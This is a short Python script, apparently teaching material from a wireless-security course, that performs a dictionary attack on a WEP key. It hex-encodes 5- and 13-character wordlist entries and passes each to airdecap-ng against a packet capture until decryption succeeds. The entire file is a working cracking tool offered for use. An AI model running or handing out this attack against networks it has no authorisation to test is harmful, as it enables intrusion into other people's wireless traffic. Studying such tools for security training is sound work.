#!/usr/bin/python
# Author - Vivek Ramachandran vivek@securitytube.net
#


import sys, binascii, re
from subprocess import Popen, PIPE

f = open(sys.argv[1], 'r')
for line in f:
	wepKey = re.sub(r'\W+', '', line)

	if not (len(wepKey) == 5 or len(wepKey) == 13)  :
		continue

	hexKey = binascii.hexlify(wepKey)
	
	print "Trying with WEP Key: " +wepKey + " Hex: " + hexKey

	p = Popen(['/usr/local/bin/airdecap-ng', '-w', hexKey, sys.argv[2]], stdout=PIPE)
	output = p.stdout.read()

	finalResult = output.split('\n')[4]
	if finalResult.find('1') != -1 :
		print "Success WEP Key Found: "  + wepKey
		sys.exit(0)

print "Failure! WEP Key Could not be Found with the existing dictionary!"
